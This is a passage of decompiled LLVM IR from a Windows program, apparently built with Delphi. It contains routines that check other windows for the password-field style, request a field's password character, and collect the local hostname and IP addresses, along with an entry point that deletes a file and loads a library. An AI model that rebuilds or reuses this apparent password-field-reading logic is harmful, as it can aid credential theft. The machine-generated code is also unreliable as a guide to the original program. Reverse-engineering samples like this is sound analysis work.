  store i32 %storemerge1, i32* %7, align 4, !insn.addr !2079
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !2080
  %9 = icmp eq i1 %8, false, !insn.addr !2081
  %10 = icmp eq i1 %9, false, !insn.addr !2082
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !2082
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !2082
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !2082
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !2082
  br i1 %10, label %dec_label_pc_407684, label %dec_label_pc_4076c4, !insn.addr !2082

dec_label_pc_407684:                              ; preds = %dec_label_pc_407660, %dec_label_pc_407684
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_40754c(), !insn.addr !2083
  %12 = call i32 @function_407660(), !insn.addr !2084
  %13 = add i32 %esp.02.reload, -8, !insn.addr !2085
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2085
  store i32 2, i32* %14, align 4, !insn.addr !2085
  %15 = add i32 %esp.02.reload, -12, !insn.addr !2086
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2086
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !2086
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !2087
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !2079
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !2079
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !2080
  %21 = icmp eq i1 %20, false, !insn.addr !2081
  %22 = icmp eq i1 %21, false, !insn.addr !2082
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !2082
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !2082
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !2082
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !2082
  br i1 %22, label %dec_label_pc_407684, label %dec_label_pc_4076c4, !insn.addr !2082

dec_label_pc_4076c4:                              ; preds = %dec_label_pc_407684, %dec_label_pc_407660
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !2088
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !2089
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !2090
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2090
  store i32 4224737, i32* %25, align 4, !insn.addr !2090
  %26 = call i32 @"@LStrClr"(), !insn.addr !2091
  ret i32 %26, !insn.addr !2092
}

define i32 @function_4076da() local_unnamed_addr {
dec_label_pc_4076da:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2093
  ret i32 %0, !insn.addr !2093
}

define i32 @function_4076df() local_unnamed_addr {
dec_label_pc_4076df:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2094
}

define i32 @function_4076e1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4076e1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2095
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2096
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2096
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2096
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2097
  %2 = call i32 @function_407580(), !insn.addr !2098
  %3 = call i32 @"@LStrCmp"(), !insn.addr !2099
  %4 = call i32 @function_407660(), !insn.addr !2100
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !2101
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !2102
  %6 = call i32 @"@LStrClr"(), !insn.addr !2103
  ret i32 %6, !insn.addr !2104
}

define i32 @function_40774d() local_unnamed_addr {
dec_label_pc_40774d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2105
  ret i32 %0, !insn.addr !2105
}

define i32 @function_407752() local_unnamed_addr {
dec_label_pc_407752:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2106
}

define i32 @function_407754(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407754:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2107
}

define i32 @function_40776f() local_unnamed_addr {
dec_label_pc_40776f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !2108
  %4 = inttoptr i32 %0 to i32*, !insn.addr !2108
  store i32 %3, i32* %4, align 4, !insn.addr !2108
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !2109
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !2109
  %9 = add i8 %6, %8, !insn.addr !2109
  %10 = inttoptr i32 %7 to i8*, !insn.addr !2109
  store i8 %9, i8* %10, align 1, !insn.addr !2109
  %11 = add i32 %2, 81, !insn.addr !2110
  %12 = inttoptr i32 %11 to i8*, !insn.addr !2110
  %13 = load i8, i8* %12, align 1, !insn.addr !2110
  %14 = trunc i32 %1 to i8, !insn.addr !2110
  %15 = add i8 %13, %14, !insn.addr !2110
  store i8 %15, i8* %12, align 1, !insn.addr !2110
  %16 = load i32, i32* %eax, align 4, !insn.addr !2111
  ret i32 %16, !insn.addr !2111
}

define x86_fp80 @function_407777() local_unnamed_addr {
dec_label_pc_407777:
  %0 = call x86_fp80 @__decompiler_undefined_function_12()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !2112
  ret x86_fp80 %1, !insn.addr !2113
}

define i32 @function_40777c() local_unnamed_addr {
dec_label_pc_40777c:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !2114
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2115
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !2115
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2115
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2116
  %3 = call i32 @function_407580(), !insn.addr !2117
  %4 = call i32 @"@LStrCmp"(), !insn.addr !2118
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !2119
  %6 = icmp eq i32 %5, 180, !insn.addr !2120
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !2121
  br i1 %6, label %dec_label_pc_4077df, label %dec_label_pc_4077ba, !insn.addr !2121

dec_label_pc_4077ba:                              ; preds = %dec_label_pc_40777c
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !2122
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !2123
  %10 = icmp eq i1 %9, false, !insn.addr !2124
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !2124
  br i1 %10, label %dec_label_pc_4077df, label %dec_label_pc_4077c6, !insn.addr !2124

dec_label_pc_4077c6:                              ; preds = %dec_label_pc_4077ba
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !2125
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4077df

dec_label_pc_4077df:                              ; preds = %dec_label_pc_4077c6, %dec_label_pc_40777c, %dec_label_pc_4077ba
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !2126
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !2127
  %13 = add i32 %esp.1, 8, !insn.addr !2128
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2128
  store i32 4225026, i32* %14, align 4, !insn.addr !2128
  %15 = call i32 @"@LStrClr"(), !insn.addr !2129
  ret i32 %15, !insn.addr !2130
}

define i32 @function_4077fb() local_unnamed_addr {
dec_label_pc_4077fb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2131
  ret i32 %0, !insn.addr !2131
}

define i32 @function_407800() local_unnamed_addr {
dec_label_pc_407800:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2132
}

define i32 @function_407802(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2133
}

define i32 @function_407818() local_unnamed_addr {
dec_label_pc_407818:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2134
  %3 = call i32* @GetDC(i32* %2), !insn.addr !2134
  %4 = ptrtoint i32* %3 to i32, !insn.addr !2134
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !2135
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2136
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !2136
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2137
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2138
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2139
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2140
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2140
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2141
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2142
  %16 = ashr i32 %15, 31, !insn.addr !2143
  %17 = zext i32 %15 to i64, !insn.addr !2144
  %18 = zext i32 %16 to i64, !insn.addr !2144
  %19 = mul i64 %18, 4294967296, !insn.addr !2144
  %20 = or i64 %19, %17, !insn.addr !2144
  %21 = zext i32 %4 to i64, !insn.addr !2144
  %22 = sdiv i64 %20, %21, !insn.addr !2144
  %23 = trunc i64 %22 to i32, !insn.addr !2144
  ret i32 %23, !insn.addr !2145
}

define i32 @function_407874() local_unnamed_addr {
dec_label_pc_407874:
  %esp.0.reg2mem = alloca i32, !insn.addr !2146
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2147
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2147
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2147
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2148
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2149
  %3 = icmp eq i32 %2, 0, !insn.addr !2149
  br i1 %3, label %dec_label_pc_4078b0, label %dec_label_pc_40789d, !insn.addr !2150

dec_label_pc_40789d:                              ; preds = %dec_label_pc_407874
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2151
  store i32 0, i32* %4, align 4, !insn.addr !2151
  br label %dec_label_pc_4078b0, !insn.addr !2152

dec_label_pc_4078b0:                              ; preds = %dec_label_pc_40789d, %dec_label_pc_407874
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2153
  %6 = icmp eq i32 %5, 0, !insn.addr !2153
  br i1 %6, label %dec_label_pc_4078c4, label %dec_label_pc_4078ba, !insn.addr !2154

dec_label_pc_4078ba:                              ; preds = %dec_label_pc_4078b0
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2155
  %8 = icmp eq i32 %7, 0, !insn.addr !2155
  %9 = icmp eq i1 %8, false, !insn.addr !2156
  br i1 %9, label %dec_label_pc_4078ce, label %dec_label_pc_4078c4, !insn.addr !2156

dec_label_pc_4078c4:                              ; preds = %dec_label_pc_4078ba, %dec_label_pc_4078b0
  %10 = call i32 @function_4079a8(), !insn.addr !2157
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2158
  br label %dec_label_pc_40796b, !insn.addr !2158

dec_label_pc_4078ce:                              ; preds = %dec_label_pc_4078ba
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2159
  %12 = icmp eq i8 %11, 0, !insn.addr !2159
  br i1 %12, label %dec_label_pc_4078f7, label %dec_label_pc_4078d8, !insn.addr !2160

dec_label_pc_4078d8:                              ; preds = %dec_label_pc_4078ce
  %13 = call i32 @function_407190(), !insn.addr !2161
  %14 = icmp eq i32 %13, 0, !insn.addr !2162
  br i1 %14, label %dec_label_pc_4078f7, label %dec_label_pc_4078f0, !insn.addr !2163

dec_label_pc_4078f0:                              ; preds = %dec_label_pc_4078d8
  %15 = call i32 @function_4079a8(), !insn.addr !2164
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2165
  br label %dec_label_pc_40796b, !insn.addr !2165

dec_label_pc_4078f7:                              ; preds = %dec_label_pc_4078d8, %dec_label_pc_4078ce
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2166
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2167
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4221044 to i32*), i32 0, i32* null), !insn.addr !2168
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4221044 to i32*), i32 0, i32* null), !insn.addr !2169
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2170
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2170
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4221044 to i32*), i32 0, i32* null), !insn.addr !2171
  %23 = call i32 @function_4079a8(), !insn.addr !2172
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2172
  br label %dec_label_pc_40796b, !insn.addr !2172

dec_label_pc_40796b:                              ; preds = %dec_label_pc_4078f7, %dec_label_pc_4078f0, %dec_label_pc_4078c4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2173
  %25 = load i32, i32* %24, align 4, !insn.addr !2173
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2174
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2175
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2175
  store i32 4225416, i32* %27, align 4, !insn.addr !2175
  %28 = call i32 @"@LStrClr"(), !insn.addr !2176
  ret i32 %28, !insn.addr !2177
}

define i32 @function_407981() local_unnamed_addr {
dec_label_pc_407981:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2178
  ret i32 %0, !insn.addr !2178
}

define i32 @function_407986() local_unnamed_addr {
dec_label_pc_407986:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2179
}

define i32 @function_407988(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407988:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2180
}

define i32 @function_4079a8() local_unnamed_addr {
dec_label_pc_4079a8:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2181
  %1 = call i32 @"@LStrClr"(), !insn.addr !2182
  ret i32 %1, !insn.addr !2183
}

define i32 @function_4079c0() local_unnamed_addr {
dec_label_pc_4079c0:
  %eax.0.reg2mem = alloca i32, !insn.addr !2184
  %esp.0.reg2mem = alloca i32, !insn.addr !2184
  %esp.15.reg2mem = alloca i32, !insn.addr !2184
  %storemerge6.reg2mem = alloca i32, !insn.addr !2184
  %.reg2mem = alloca i32, !insn.addr !2184
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2184
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2185
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2186
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2187
  %5 = call i32 @"@LStrClr"(), !insn.addr !2188
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2189
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2189
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2190
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2191
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2192
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2192
  %11 = icmp eq %hostent* %9, null, !insn.addr !2193
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2194
  br i1 %11, label %dec_label_pc_407a1e, label %dec_label_pc_4079f8, !insn.addr !2194

dec_label_pc_4079f8:                              ; preds = %dec_label_pc_4079c0
  %12 = add i32 %10, 12, !insn.addr !2195
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2195
  %14 = load i32, i32* %13, align 4, !insn.addr !2195
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2196
  %16 = load i32, i32* %15, align 4, !insn.addr !2196
  %17 = icmp eq i32 %16, 0, !insn.addr !2197
  %18 = icmp eq i1 %17, false, !insn.addr !2198
  br i1 %18, label %dec_label_pc_4079ff.lr.ph, label %dec_label_pc_407a19, !insn.addr !2198

dec_label_pc_4079ff.lr.ph:                        ; preds = %dec_label_pc_4079f8
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2191
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4079ff

dec_label_pc_4079ff:                              ; preds = %dec_label_pc_4079ff.lr.ph, %dec_label_pc_407a11
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2199
  %21 = icmp eq i1 %20, false, !insn.addr !2200
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2200
  br i1 %21, label %dec_label_pc_407a11, label %dec_label_pc_407a03, !insn.addr !2200

dec_label_pc_407a03:                              ; preds = %dec_label_pc_4079ff
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2201
  %23 = load i32, i32* %22, align 4, !insn.addr !2201
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2201
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2201
  store i32 %23, i32* %25, align 4, !insn.addr !2201
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2202
  %27 = call i32 @StrPas(), !insn.addr !2203
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2203
  br label %dec_label_pc_407a11, !insn.addr !2203

dec_label_pc_407a11:                              ; preds = %dec_label_pc_407a03, %dec_label_pc_4079ff
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2204
  %29 = mul i32 %28, 4, !insn.addr !2196
  %30 = add i32 %29, %14, !insn.addr !2196
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2196
  %32 = load i32, i32* %31, align 4, !insn.addr !2196
  %33 = icmp eq i32 %32, 0, !insn.addr !2197
  %34 = icmp eq i1 %33, false, !insn.addr !2198
  store i32 %32, i32* %.reg2mem, !insn.addr !2198
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2198
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2198
  br i1 %34, label %dec_label_pc_4079ff, label %dec_label_pc_407a19, !insn.addr !2198

dec_label_pc_407a19:                              ; preds = %dec_label_pc_407a11, %dec_label_pc_4079f8
  %35 = call i32 @WSACleanup(), !insn.addr !2205
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2205
  br label %dec_label_pc_407a1e, !insn.addr !2205

dec_label_pc_407a1e:                              ; preds = %dec_label_pc_407a19, %dec_label_pc_4079c0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2206
}

define i32 @function_407a2c() local_unnamed_addr {
dec_label_pc_407a2c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2207
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2207
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2207
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2208
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2209
  %3 = add i32 %2, 1, !insn.addr !2209
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2209
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2210
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2211
  ret i32 0, !insn.addr !2212
}

define i32 @function_407a51() local_unnamed_addr {
dec_label_pc_407a51:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2213
  ret i32 %0, !insn.addr !2213
}

define i32 @function_407a56() local_unnamed_addr {
dec_label_pc_407a56:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2214
}

define i32 @function_407a58(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2215
}

define i32 @function_407a5c() local_unnamed_addr {
dec_label_pc_407a5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2216
  %2 = add i32 %1, -1, !insn.addr !2216
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2216
  ret i32 %0, !insn.addr !2217
}

define i32 @function_407a64() local_unnamed_addr {
dec_label_pc_407a64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2218
}

define i32 @SetFieldText.51() local_unnamed_addr {
dec_label_pc_407a8f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2219
  ret i32 %0, !insn.addr !2219
}

define i32 @function_407a94() local_unnamed_addr {
dec_label_pc_407a94:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2220
}

define i32 @function_407a96(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a96:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2221
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b80:
  %esp.2.reg2mem = alloca i32, !insn.addr !2222
  %esp.1.reg2mem = alloca i32, !insn.addr !2222
  %esp.0.reg2mem = alloca i32, !insn.addr !2222
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2223
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2224
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2224
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2224
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2225
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2226
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f0 to i8*), i32 0), !insn.addr !2227
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2228
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2228
  store i8 0, i8* %6, align 1, !insn.addr !2228
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2229
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2230
  %9 = call i32 @function_4075b8(), !insn.addr !2231
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2232
  %11 = call i32 @function_407630(), !insn.addr !2233
  %12 = trunc i32 %11 to i8, !insn.addr !2234
  %13 = icmp eq i8 %12, 0, !insn.addr !2234
  br i1 %13, label %dec_label_pc_407c97, label %dec_label_pc_407c1c, !insn.addr !2235

dec_label_pc_407c1c:                              ; preds = %dec_label_pc_407b80
  %14 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2236
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2237
  store i32 -1, i32* %15, align 4, !insn.addr !2237
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2238
  %17 = call i32 @function_4075f8(), !insn.addr !2239
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2240
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2241
  %20 = call i32 @function_4036c8(), !insn.addr !2242
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2243
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2244
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2245
  %24 = call i32 @function_4036c8(), !insn.addr !2246
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2247
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2247
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2247
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2248
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2248
  store i32 %28, i32* @global_var_408118, align 4, !insn.addr !2249
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2250
  br label %dec_label_pc_407cc4, !insn.addr !2250

dec_label_pc_407c97:                              ; preds = %dec_label_pc_407b80
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2226
  %30 = call i32 @function_40661c(), !insn.addr !2251
  %31 = call i32 @function_407630(), !insn.addr !2252
  %32 = trunc i32 %31 to i8, !insn.addr !2253
  %33 = icmp eq i8 %32, 0, !insn.addr !2253
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2254
  br i1 %33, label %dec_label_pc_407e06, label %dec_label_pc_407cb9, !insn.addr !2254

dec_label_pc_407cb9:                              ; preds = %dec_label_pc_407c97
  %34 = load i32, i32* @global_var_408138, align 4, !insn.addr !2255
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2256
  store i32 -1, i32* %35, align 4, !insn.addr !2256
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2256
  br label %dec_label_pc_407cc4, !insn.addr !2256

dec_label_pc_407cc4:                              ; preds = %dec_label_pc_407cb9, %dec_label_pc_407c1c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2257
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2257
  store i32 260, i32* %37, align 4, !insn.addr !2257
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2258
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2258
  store i32 ptrtoint (i8** @global_var_4096f0 to i32), i32* %39, align 4, !insn.addr !2258
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2259
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2259
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2260
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2260
  store i32 %41, i32* %43, align 4, !insn.addr !2260
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2261
  %45 = add i32 %44, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2262
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2262
  store i8 0, i8* %46, align 1, !insn.addr !2262
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2263
  %48 = call i32 @function_4075f8(), !insn.addr !2264
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2265
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2266
  %51 = load i32, i32* @global_var_408138, align 4, !insn.addr !2267
  %52 = icmp eq i32 %51, 0, !insn.addr !2267
  br i1 %52, label %dec_label_pc_407d5d, label %dec_label_pc_407d2a, !insn.addr !2268

dec_label_pc_407d2a:                              ; preds = %dec_label_pc_407cc4
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2269
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2269
  store i32 ptrtoint ([16 x i8]* @global_var_407e88 to i32), i32* %54, align 4, !insn.addr !2269
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2270
